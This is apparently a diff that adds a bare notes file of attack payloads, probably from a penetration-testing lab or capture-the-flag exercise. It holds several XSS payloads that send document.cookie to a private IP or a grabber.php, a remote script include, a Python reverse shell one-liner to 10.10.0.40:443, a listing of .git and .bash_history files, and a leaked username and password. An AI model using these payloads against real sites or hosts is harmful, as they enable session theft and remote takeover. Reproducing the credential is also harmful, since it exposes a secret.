@@ -1,0 +1,22 @@
+<img src=x onerror=this.src="http://10.10.0.40/?c="%2bdocument.cookie>
+
+<script>document.location='http://10.10.0.40/grabber.php?c='+document.cookie</script>
+
+<img src="10.10.0.40/test.jpg" /> <script src="http://10.10.0.40/test.js"></script>
+
+
+<script>document.location='http://10.10.0.40/grabber.php?c='+document.cookie</script>
+
+
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+ python -m SimpleHTTPServer 80
+
+ drwxrwxr-x 8 grey grey 4096 Jul 14 13:48 /home/grey/adminPanel/.git
+-rw-rw-r-- 1 grey grey 265 Jul 14 13:48 /home/grey/adminPanel/.git/config
+-rw------- 1 grey grey 22 Jul 14 14:17 /home/grey/.bash_history
+
+-# beta user: carla
+-# password: >F73SzS36>V$tJmc
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.40",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
